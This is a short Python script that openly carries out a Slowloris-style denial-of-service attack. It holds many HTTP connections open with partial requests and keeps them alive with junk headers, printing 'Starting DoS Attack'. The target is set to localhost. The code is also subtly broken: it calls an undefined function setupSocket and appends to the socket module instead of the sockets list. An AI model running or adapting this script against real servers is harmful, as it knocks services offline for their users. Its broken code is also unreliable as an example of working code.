#!/usr/bin/env python

import socket
import random
import time
import sys


# HTTP Request messages
headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []

def socketInitialization(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((host, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock


if __name__ == "__main__":

    host = 'localhost'
    count = 200

    print("Starting DoS Attack on {}. Connecting to {} socket".format(host, count))

    for _ in range(count):
        try:
            print("Socket {}".format(_))
            sock = setupSocket(host)
        except socket.error:
            break

        socket.append(sock)

    while True:
        print("Connected to {} sockets. Sending headers...".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print("Re-opening closed sockets...")
            try:
                sock = setupSocket(host)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break

        time.sleep(15)

